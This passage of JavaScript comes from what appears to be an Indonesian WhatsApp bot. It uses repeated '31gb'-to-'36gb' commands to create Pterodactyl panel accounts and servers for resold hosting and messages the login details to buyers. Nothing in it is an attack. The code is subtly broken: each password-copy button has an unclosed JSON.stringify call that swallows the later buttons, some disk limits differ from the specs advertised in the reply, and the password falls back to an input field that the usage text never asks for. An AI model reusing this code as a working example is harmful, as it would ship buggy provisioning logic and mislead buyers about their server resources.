"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 30150
│ • *DISK :* 30150
│ • *CPU :* 900%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "31gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "31150"
let cpu = "930"
let disk = "31150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 31150
│ • DISK : 31150
│ • CPU : 930%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 31150
│ • *DISK :* 31150
│ • *CPU :* 930%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "32gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "32150"
let cpu = "960"
let disk = "31150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 32150
│ • DISK : 32150
│ • CPU : 960%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 32150
│ • *DISK :* 32150
│ • *CPU :* 960%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "33gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "33150"
let cpu = "990"
let disk = "33150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 33150
│ • DISK : 33150
│ • CPU : 990%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 33150
│ • *DISK :* 33150
│ • *CPU :* 990%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "34gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "34150"
let cpu = "1020"
let disk = "24150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 34150
│ • DISK : 34150
│ • CPU : 1020%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 34150
│ • *DISK :* 34150
│ • *CPU :* 1020%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "35gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "35150"
let cpu = "1050"
let disk = "35150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 35150
│ • DISK : 35150
│ • CPU : 1050%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 35150
│ • *DISK :* 35150
│ • *CPU :* 1050%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "36gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "36150"
let cpu = "1080"
let disk = "36150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 36150
│ • DISK : 36150
│ • CPU : 1080%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
